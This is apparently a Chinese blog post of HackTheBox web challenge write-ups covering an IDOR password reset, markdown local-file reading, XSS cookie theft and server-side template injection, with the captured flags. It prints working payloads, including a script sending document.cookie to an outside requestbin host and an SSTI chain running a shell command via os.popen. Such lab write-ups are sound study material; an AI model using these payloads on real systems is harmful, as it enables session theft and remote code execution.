---
title: Web - 网络安全
date: 2025-03-31 18:32:09
tags:
---

# Web  Writeups



## 解题路径

查看开发者工具



### Server Side Template Injection (SSTI)

https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti



## javascript

从开发者工具里面



# Writeups



## IDOR

### HTB Armaxis

> markdown, idor

这个网站的reset password会把token发送到email里面，但是这个token可以重置任意的email。我们从 `database.js` 里面得知管理员的账户是 `admin@armaxis.htb` , 于是我们用 `test@email.htb` 申请一个账户并且拿到重置密码的token，然后用hackbar发送一个reset-password的请求，可以在 `index.js` 里面看到这个，它会读取post的三个参数并且重置密码。这样我们重置了管理员账户的密码登录上去。

第二步是，disbute weapon里面会有个markdown，这个markdon可以读取本地的文件。因为 `markdown.js` 里面的 parse函数，会先把filecontent下载下来，然后用base64编码，于是我们构造payload是

``` md
![img](file:///flag.txt)
```

这样的图片，然后显示源代码拿到base64，解码得到flag

``` shell
HTB{m4rkd0wn_bugs_1n_th3_w1ld!}
```

## XSS

### HTB OnlyHacks 

> xss

这是一个很抽象的交友聊天网站，注册后登录进去。全点心心，然后会有人找你俩天。那个聊天框有XSS漏洞。再开发者工具里面查看cookie的httponly是没有勾选的。也就是说可以盗取对面的cookie. 于是先新建一个requestbin: https://requestbin.whapi.cloud/

然后发送

``` html
<script>document.location="http://requestbin.whapi.cloud/txg9l7tx/?flag="+document.cookie</script>
```

这样就把对面的cookie发送过来了. 然后在浏览器里面修改成对面的cookie，之后刷新页面。看到有个人发送了flag进来

``` shell
HTB{d0nt_trust_str4ng3r5_bl1ndly}
```

##  SSTI

### HTB Spookifier

> ssti

通过 `${7*7}` 测试，然后payload用

``` python
${ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['__builtins__']['__import__']('os').popen('cat ../flag.txt').read()}
```

使用的时候，需要查找一下 `os._wrap_close` 类的 index 就可以了

``` shell
HTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!}
```

## 抓包

### HTB Flag Command

> 抓包, js代码审计

从开发者工具里面抓包，找到游戏的 `main.js` ，里面发现有个 `fetchOptions` 里面通过发送请求，得到所有可以执行的命令。然后在开发者工具的抓包里面看到 `options` 就是这个请求，我们打开看看请求返回的内容，在里面得到看到一个secret的命令 `Blip-blop, in a pickle with a hiccup! Shmiggity-shmack`。 在游戏start后，输入这个命令，就可以得到flag了

``` shell
HTB{D3v3l0p3r_t00l5_4r3_b35t__t0015_wh4t_d0_y0u_Th1nk??}
```



